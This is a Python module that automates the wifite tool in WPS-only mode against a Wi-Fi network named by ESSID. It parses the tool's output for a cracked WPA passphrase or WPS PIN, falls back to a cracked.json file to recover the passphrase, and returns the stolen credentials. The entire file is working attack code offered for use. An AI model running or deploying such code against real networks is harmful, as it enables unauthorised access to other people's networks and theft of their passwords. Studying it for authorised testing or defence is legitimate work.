import subprocess
import time
import re
import logging
import os
import json
import threading
from constants import BASE_DIR, CRACKED_FILE, ATTACK_TIMEOUT
from utils import redact_sensitive_text, strip_ansi, terminate_process_group

WIFITE_ARGS = [
    "wifite",
    "--wps-only",
    "--ignore-locks"
]


def extract_psk(line):
    if "WPA PSK:" in line or "PSK/Password:" in line:
        match = re.search(r'(?:WPA PSK|PSK/Password):\s*(.+)', line)
        if match:
            psk_candidate = match.group(1).strip().strip("'\"")
            if psk_candidate.lower() != "n/a":
                return psk_candidate
    return None


def extract_pin(line):
    if "WPS PIN:" in line or "Cracked WPS PIN:" in line:
        match = re.search(r'WPS PIN:\s*([0-9]{8})', line)
        if match:
            return match.group(1).strip()
    return None


def kill_proc_later(proc, timeout):
    def _kill():
        time.sleep(timeout)
        if proc.poll() is None:
            logging.warning(f"Attack timeout ({timeout}s) reached — killing process group.")
            terminate_process_group(proc)
    threading.Thread(target=_kill, daemon=True).start()


def attack_target(interface, essid):
    logging.info(f"Starting attack on {essid}...")

    os.makedirs(BASE_DIR / "data", exist_ok=True)
    os.chdir(BASE_DIR / "data")

    proc = subprocess.Popen(
        WIFITE_ARGS + ["-i", interface, "-e", essid],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )

    kill_proc_later(proc, ATTACK_TIMEOUT)

    psk = None
    pin = None

    try:
        for line in proc.stdout:
            line = strip_ansi(line.strip())
            if not line:
                continue
            logging.debug(f"[wifite] {redact_sensitive_text(line)}")

            if not psk:
                psk = extract_psk(line)
                if psk:
                    logging.info(f"PSK found for {essid}.")
                    break

            if not pin:
                maybe_pin = extract_pin(line)
                if maybe_pin:
                    pin = maybe_pin
                    logging.info(f"WPS PIN found for {essid}.")
    finally:
        terminate_process_group(proc)

    # Fallback: try to recover PSK from cracked.json
    if pin and not psk and CRACKED_FILE.exists():
        try:
            with open(CRACKED_FILE) as f:
                cracked_data = json.load(f)
            for entry in cracked_data:
                if entry.get("essid") == essid and entry.get("pin") == pin:
                    recovered_psk = entry.get("psk")
                    if recovered_psk:
                        psk = recovered_psk
                        logging.info(f"Recovered PSK from cracked.json for {essid}.")
        except Exception as e:
            logging.warning(f"Failed to parse cracked.json: {e}")

    if psk:
        return {"psk": psk, "pin": pin}
    elif pin:
        return {"pin": pin}
    else:
        logging.info(f"Attack on {essid} failed. No credentials obtained.")
        return None
